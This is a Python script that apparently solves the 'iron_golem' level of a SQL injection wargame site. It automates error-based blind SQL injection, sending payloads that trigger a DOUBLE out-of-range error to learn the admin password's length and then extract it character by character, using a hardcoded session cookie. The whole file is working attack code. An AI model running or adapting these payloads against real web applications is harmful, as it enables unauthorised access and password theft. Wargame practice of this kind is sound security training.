import urllib.request
from urllib.parse import quote  # url encoding func

url = 'http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw='
result = ""
pwlen = 0

__author__ = "goodasd123@naver.com - h4lo"


def req(query):
    re = urllib.request.Request(query)
    re.add_header('User-Agent', 'Mozilla/5.0')
    re.add_header('Cookie', 'PHPSESSID=5e2uqn824tuu6a7hjdn2jc8aj2')
    res = urllib.request.urlopen(re)
    return res

for i in range(0, 100):
    add_url = "' or id='admin' and if((length(pw)='{}'),\
    power(2,99999999999),0) -- ;".format(i)
    query = url + quote(add_url)

    if str(req(query).read()).find('DOUBLE value is out of range in') != -1:
        pwlen = i
        print("[Password length is {}!]".format(pwlen))
        break
    else:
        print("Matching.. -> [{}]".format(i))

for i in range(1, pwlen + 1):
    for j in range(ord('0'), (ord('z') + 1)):
        add_url = "' or id='admin' and if((substr(pw,{},1)='{}'),\
        power(2,99999999999),0) -- ;".format(i, chr(j))
        query = url + quote(add_url)

        if str(req(query).read()).find('DOUBLE value is out of range in') != -1:
            result += chr(j).lower()
            print("[Find!! - {} // {}]".format(chr(j), result))
            break
        else:
            print("Matching.. -> [{}]".format(chr(j)))

print("Blind SQL Injection completed.")
print("Password is {}".format(result))
